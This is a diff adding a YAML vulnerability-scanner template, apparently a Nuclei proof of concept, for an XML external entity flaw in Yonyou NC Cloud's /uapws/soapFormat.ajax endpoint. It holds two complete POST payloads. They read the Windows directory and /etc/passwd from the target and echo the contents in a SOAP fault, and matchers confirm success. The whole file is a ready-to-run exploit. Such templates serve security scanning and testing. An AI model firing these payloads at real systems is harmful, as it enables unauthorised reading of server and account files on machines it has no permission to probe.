@@ -1,0 +1,44 @@
+id: yaml-poc-yonyou-yonyou_nc_cloud-xxe-CT-469737
+info:
+  name: Yaml Poc Yonyou Yonyou_Nc_Cloud Xxe Ct 469737
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-yonyou-yonyou_nc_cloud-xxe-CT-469737'
+  tags: xxe
+  reference: []
+http:
+- method: POST
+  path:
+  - /uapws/soapFormat.ajax
+  body: msg=<!DOCTYPE foo[<!ENTITY xxe1two SYSTEM "file:///c:/windows/"> ]><soap:Envelope
+    xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><soap:Fault><faultcode>soap:Server%26xxe1two%3b</faultcode></soap:Fault></soap:Body></soap:Envelope>%0a
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - soap:ServerADFS
+    - appcompat
+    - win.ini
+    - explorer.exe
+- method: POST
+  path:
+  - /uapws/soapFormat.ajax
+  body: msg=<!DOCTYPE foo[<!ENTITY xxe1two SYSTEM "file:////etc/passwd"> ]><soap:Envelope
+    xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><soap:Fault><faultcode>soap:Server%26xxe1two%3b</faultcode></soap:Fault></soap:Body></soap:Envelope>%0a
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: regex
+    part: body
+    regex:
+    - root:[^:]*:[0-9]*:[0-9]*:[^:]*
